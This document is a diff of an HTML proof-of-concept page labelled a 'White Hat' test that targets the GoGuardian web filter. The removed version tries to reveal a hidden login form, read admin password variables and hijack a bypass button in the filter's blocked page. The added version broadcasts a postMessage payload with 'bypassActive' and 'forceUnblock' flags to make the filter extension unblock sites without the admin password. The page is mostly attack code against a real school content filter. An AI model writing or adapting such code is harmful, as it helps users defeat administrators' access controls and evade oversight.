@@ -1,69 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>White Hat Security Audit</title>
+    <meta charset="UTF-8">
+    <title>White Hat Test #4: Privilege Escalation</title>
     <style>
-        body { font-family: 'Roboto', sans-serif; background: #111; color: #eee; text-align: center; padding: 40px; }
-        .dashboard { border: 2px solid #00AAD7; display: inline-block; padding: 30px; border-radius: 10px; background: #1a1a1a; }
-        button { 
-            display: block; width: 100%; margin: 10px 0; padding: 12px; 
-            background: #00AAD7; color: white; border: none; cursor: pointer; font-weight: bold; 
-        }
-        button:hover { background: #008cb1; }
-        .warning { color: #ff4d4d; font-size: 12px; margin-top: 20px; }
+        body { background: #121212; color: #00ff00; font-family: 'Courier New', monospace; padding: 40px; text-align: center; }
+        .exploit-card { border: 1px solid #00ff00; padding: 20px; display: inline-block; border-radius: 8px; background: #1a1a1a; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #00cc00; }
+        .log { margin-top: 20px; color: #888; font-size: 0.9em; text-align: left; }
     </style>
 </head>
 <body>
 
-    <div class="dashboard">
-        <h2>Security Audit Tools</h2>
-        <p>Target: <strong>https://blocked.goguardian.com/?ctx=YWZpPTI2MjQwMzg4JmFwaT0yMDc2MzYmb2k9MTQ5ODI3MDUxMTImb3U9aHR0cCUzQSUyRiUyRnNsaXRoZXIuaW8lMkYmcnM9QURNSU5fU0lURV9GSUxURVImc3Q9c2hpZWxkJnY9MQ%3D%3D&sum=7fd57f78</strong></p>
-        <hr style="border: 0; border-top: 1px solid #333;">
+    <div class="exploit-card">
+        <h2>Privilege Escalation POC</h2>
+        <p>Target Action: <code>youtube/settingsRequest</code></p>
+        <p>Goal: Force the extension to "unblock" or "bypass" without the admin password.</p>
         
-        <button onclick="exploit(1)">1. Force Reveal UI (CSS Bypass)</button>
-        <button onclick="exploit(2)">2. Sniff Variables (Password Search)</button>
-        <button onclick="exploit(3)">3. Hijack Logic (Function Overwrite)</button>
+        <button onclick="sendExploit()">Execute Escalation Attack</button>
         
-        <p class="warning">If these buttons work, your file needs a "Private Scope" patch.</p>
+        <div class="log" id="statusLog">Status: Waiting for interaction...</div>
     </div>
 
     <script>
-        let targetWindow;
-
-        function exploit(type) {
-            // Open the target if not already open
-            if (!targetWindow || targetWindow.closed) {
-                targetWindow = window.open('https://blocked.goguardian.com/?ctx=YWZpPTI2MjQwMzg4JmFwaT0yMDc2MzYmb2k9MTQ5ODI3MDUxMTImb3U9aHR0cCUzQSUyRiUyRnNsaXRoZXIuaW8lMkYmcnM9QURNSU5fU0lURV9GSUxURVImc3Q9c2hpZWxkJnY9MQ%3D%3D&sum=7fd57f78', '_blank');
-            }
-
-            // Wait a moment for the page to be ready
-            setTimeout(() => {
-                if (type === 1) {
-                    // ATTACK 1: Force Reveal
-                    targetWindow.document.getElementById('logindiv').style.display = 'block';
-                    targetWindow.document.getElementById('logindiv').style.height = 'auto';
-                    targetWindow.document.getElementById('logindiv').style.width = 'auto';
-                    alert("Audit 1: UI Revealed using CSS overwrite.");
-                } 
-                else if (type === 2) {
-                    // ATTACK 2: Variable Sniffing
-                    // It tries to find common names like 'ADMIN_SECRET' or 'password'
-                    const secret = targetWindow.ADMIN_SECRET || targetWindow.password;
-                    alert(secret ? "Audit 2: Secret Found! -> " + secret : "Audit 2: Secret is Private (Secure).");
-                } 
-                else if (type === 3) {
-                    // ATTACK 3: Logic Hijack
-                    // We rewrite their button action to skip the password entirely
-                    const btn = targetWindow.document.querySelector('.submitAll') || targetWindow.document.getElementById('submitBtn');
-                    if (btn) {
-                        btn.onclick = function() {
-                            alert("Audit 3: Logic Hijacked! Bypassing password check...");
-                            targetWindow.location.href = "https://google.com"; // Redirects anywhere
-                        };
-                        alert("Audit 3: Button Hijacked. Try clicking 'Bypass' in the other window!");
+        function sendExploit() {
+            const log = document.getElementById('statusLog');
+            
+            // This mimics the command your bridge script uses
+            // We use '*' to see if the extension accepts it from ANY origin
+            const payload = {
+                type: "youtube/settingsRequest",
+                detail: {
+                    payload: {
+                        bypassActive: true, 
+                        requestedBy: "attacker-site",
+                        forceUnblock: true
                     }
                 }
-            }, 500);
+            };
+
+            // Attempting to talk directly to the extension context
+            window.top.postMessage(payload, "*");
+            
+            log.innerText = "Status: Exploit payload broadcasted to top frame.";
+            console.log("Exploit Sent:", payload);
         }
     </script>
 </body>
